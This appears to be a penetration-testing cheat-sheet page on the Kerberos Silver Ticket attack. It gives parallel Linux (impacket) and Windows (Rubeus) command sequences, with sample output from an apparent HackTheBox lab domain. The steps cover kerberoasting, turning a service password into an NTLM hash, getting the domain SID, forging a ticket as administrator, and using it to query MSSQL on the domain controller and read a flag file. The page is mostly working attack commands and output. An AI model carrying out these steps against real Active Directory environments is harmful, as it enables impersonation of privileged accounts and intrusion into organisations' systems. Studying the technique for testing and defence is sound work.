---
title: "Silver Ticket"
date: 2024-7-30
tags: ["Pass-The-Ticket", "SID", "Rubeus", "Ticket Granting Ticket", "Silver Ticket", "Sidhistory", "Domain Controller", "Active Directory", "Windows", "GetUserSPNs"]
---

### Silver Ticket Attack

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Get Service Principle Name (SPN) \[Optional\]

```console
sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -k
```

```console
# If NTLM auth is disabled
sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k
```

#### 2. Generate NTLM

```console
iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
```

```console {class="sample-code"}
$ iconv -f ASCII -t UTF-16LE <(printf 'REGGIE1234ronnie') | openssl dgst -md4 
MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf
```

#### 3. Get Domain SID

```console
sudo ntpdate -s <DC_IP> && impacket-getPac -targetUser administrator '<DOMAIN>/<USER>:<PASSWORD>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.sequel.htb && impacket-getPac -targetUser administrator 'sequel.htb/sql_svc:REGGIE1234ronnie'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

KERB_VALIDATION_INFO 
LogonTime:                      
    dwLowDateTime:                   4131845666 
    dwHighDateTime:                  31133135 

---[SNIP]---
 
Domain SID: S-1-5-21-4078382237-1492182817-2568127209

 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...
```

#### 4. Generate Silver Ticket

```console
impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn anything/<DC> administrator
```

```console {class="sample-code"}
$ impacket-ticketer -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn anything/dc.sequel.htb administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sequel.htb/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

#### 5. Import Ticket

```console
export KRB5CCNAME=administrator.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=administrator.ccache
```

#### 6. Check

```console
klist
```

```console {class="sample-code"}
$ klist
Ticket cache: FILE:administrator.ccache
Default principal: administrator@SEQUEL.HTB

Valid starting     Expires            Service principal
09/25/24 07:55:27  09/23/34 07:55:27  anything/dc.sequel.htb@SEQUEL.HTB
        renew until 09/23/34 07:55:27
```

#### 7. Access Service

```console
# For example: mssql
impacket-mssqlclient -k <DC>
```

```console {class="sample-code"}
$ impacket-mssqlclient -k dc.sequel.htb                                                
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sequel\Administrator  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) AS Contents
BulkColumn                                
---------------------------------------   
b'2186a912c7f240246fd2c2b04651f9b4\r\n'
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Get Service Principle Name (SPN) \[Optional\]

```console
.\rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC> /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>' /nowrap
```

#### 2. Generate NTLM

```console
.\rubeus.exe hash /password:'<PASSWORD>'
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\sql_svc\Documents> .\rubeus.exe hash /password:'REGGIE1234ronnie'

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : REGGIE1234ronnie
[*]       rc4_hmac             : 1443EC19DA4DAC4FFC953BCA1B57B4CF

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```

#### 3. Get Domain SID

#### 3a. Locally

```console
import-module activedirectory
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\sql_svc\Documents> import-module activedirectory
```

```console
Get-ADDomain | fl DomainSID
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\sql_svc\Documents> Get-ADDomain | fl DomainSID

DomainSID : S-1-5-21-4078382237-1492182817-2568127209
```

#### 3b. Remotely

```console
# Install ldp.exe (Windows 11)
Settings > System > Optional Features > More Windows Features and add 'Active Directory Lightweight Directory Services'
```

```console
# Bind > Bind with credentials
ldp.exe
```

```console
# Browse > Search
BaseDN: DC=<EXAMPLE>,DC=<COM>
Filter: (objectclass=User)
```

#### 4. Generate Silver Ticket

```console
.\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:anything/<DC> /nowrap /ptt
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\sql_svc\Documents> .\rubeus.exe silver /domain:sequel.htb /dc:dc.sequel.htb /sid:S-1-5-21-4078382237-1492182817-2568127209 /rc4:1443EC19DA4DAC4FFC953BCA1B57B4CF /user:administrator /service:anything/dc.sequel.htb /nowrap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : SEQUEL.HTB (SEQUEL)
[*] SID            : S-1-5-21-4078382237-1492182817-2568127209
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 1443EC19DA4DAC4FFC953BCA1B57B4CF
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 1443EC19DA4DAC4FFC953BCA1B57B4CF
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : anything
[*] Target         : dc.sequel.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'administrator' to 'anything/dc.sequel.htb'

[*] AuthTime       : 9/24/2024 5:06:04 PM
[*] StartTime      : 9/24/2024 5:06:04 PM
[*] EndTime        : 9/25/2024 3:06:04 AM
[*] RenewTill      : 10/1/2024 5:06:04 PM

[*] base64(ticket.kirbi):

      doIFUTCCBU ---[SNIP]--- F1ZWwuaHRi


[+] Ticket successfully imported!
```

#### 5. Check

```console
klist
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\sql_svc\Documents> klist

Current LogonId is 0:0x1293866

Cached Tickets: (1)

#0>     Client: administrator @ SEQUEL.HTB
        Server: anything/dc.sequel.htb @ SEQUEL.HTB
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/24/2024 17:06:04 (local)
        End Time:   9/25/2024 3:06:04 (local)
        Renew Time: 10/1/2024 17:06:04 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

{{< /tabcontent >}}
